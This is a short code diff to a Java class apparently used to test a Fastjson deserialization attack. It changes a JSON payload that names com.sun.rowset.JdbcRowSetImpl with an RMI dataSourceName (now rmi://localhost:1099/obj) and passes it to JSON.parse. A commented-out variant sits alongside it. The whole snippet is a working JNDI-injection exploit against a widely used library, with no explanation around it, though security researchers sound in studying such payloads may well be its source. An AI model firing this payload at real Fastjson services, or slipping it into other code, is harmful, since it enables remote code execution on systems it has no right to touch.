@@ -124,7 +124,7 @@ public class Fastjson {
 //        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost:1023/RMIObj\",\"autoCommit\": false}";
 //        JSON.parse(payload,Feature.SupportNonPublicField);
 
-        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1023/RMIObj\",\"autoCommit\": true}";
+        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\"}";
         JSON.parse(payload2);
     }
 }
